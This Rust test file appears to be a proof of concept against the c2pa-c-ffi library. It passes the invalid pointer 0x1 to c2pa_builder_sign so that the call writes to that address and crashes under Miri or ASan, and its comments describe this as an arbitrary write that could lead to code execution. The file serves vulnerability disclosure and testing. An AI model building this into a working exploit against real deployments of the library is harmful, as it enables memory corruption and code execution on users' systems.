//! High-impact PoC: triggers an **arbitrary write** through an attacker-controlled
//! pointer in `c2pa_builder_sign`.
//!
//! The FFI function trusts that `manifest_bytes_ptr` points to valid, writable
//! memory.  We pass the value `0x1` instead.  When the signing operation
//! succeeds, Rust writes a heap pointer to address `0x1`, which is almost
//! guaranteed to SIGSEGV under ASan/Miri and demonstrates memory-corruption
//! potential that could be turned into code-execution.
//!
//! Run with:
//! ```bash
//! cargo +nightly miri test -p c2pa-c-ffi --lib unsafe_poc
//! ```
//! or with ASan (release build):
//! ```bash
//! RUSTFLAGS="-Zsanitizer=address" cargo +nightly test -Zbuild-std --target x86_64-pc-windows-msvc --release -p c2pa-c-ffi --lib unsafe_poc
//! ```

#[cfg(test)]
mod tests {
    use super::*;
    use std::ffi::CString;

    use crate::{
        C2paSignerInfo, TestC2paStream, {
            c2pa_builder_from_json, c2pa_builder_sign, c2pa_builder_free,
            c2pa_signer_from_info, c2pa_signer_free,
        },
    };

    /// Expect Miri/ASan to flag the illegal write.
    #[test]
    #[should_panic]
    fn builder_sign_arbitrary_write() {
        // --- Builder ---
        let manifest_def = CString::new("{}" /* empty manifest */).unwrap();
        let builder = unsafe { c2pa_builder_from_json(manifest_def.as_ptr()) };
        assert!(!builder.is_null());

        // --- Signer --- (reuse fixtures from existing tests)
        let certs = include_str!("../../sdk/tests/fixtures/certs/ed25519.pub");
        let private_key = include_bytes!("../../sdk/tests/fixtures/certs/ed25519.pem");
        let alg = CString::new("Ed25519").unwrap();
        let sign_cert = CString::new(certs).unwrap();
        let private_key = CString::new(private_key).unwrap();
        let signer_info = C2paSignerInfo {
            alg: alg.as_ptr(),
            sign_cert: sign_cert.as_ptr(),
            private_key: private_key.as_ptr(),
            ta_url: std::ptr::null(),
        };
        let signer = unsafe { c2pa_signer_from_info(&signer_info) };
        assert!(!signer.is_null());

        // --- Streams --- (dummy in-memory vectors)
        let source_image = vec![0u8; 10]; // minimal dummy bytes
        let mut source_stream = TestC2paStream::from_bytes(source_image);
        let dest_vec = Vec::new();
        let mut dest_stream = TestC2paStream::new(dest_vec).into_c_stream();

        // --- Malicious pointer ---
        let manifest_bytes_ptr = 0x1 as *mut *const u8; // intentionally invalid but non-NULL

        // --- Call vulnerable FFI ---
        // Valid MIME type expected by builder.sign(); use "image/jpeg".
        let format = CString::new("image/jpeg").unwrap();
        unsafe {
            // This should crash inside c2pa_builder_sign when it writes to address 0x1.
            c2pa_builder_sign(
                builder,
                format.as_ptr(),
                &mut source_stream,
                &mut dest_stream,
                signer,
                manifest_bytes_ptr,
            );
        }

        // Cleanup (unlikely reached if exploit successful)
        unsafe {
            c2pa_builder_free(builder);
            c2pa_signer_free(signer);
        }
    }
}
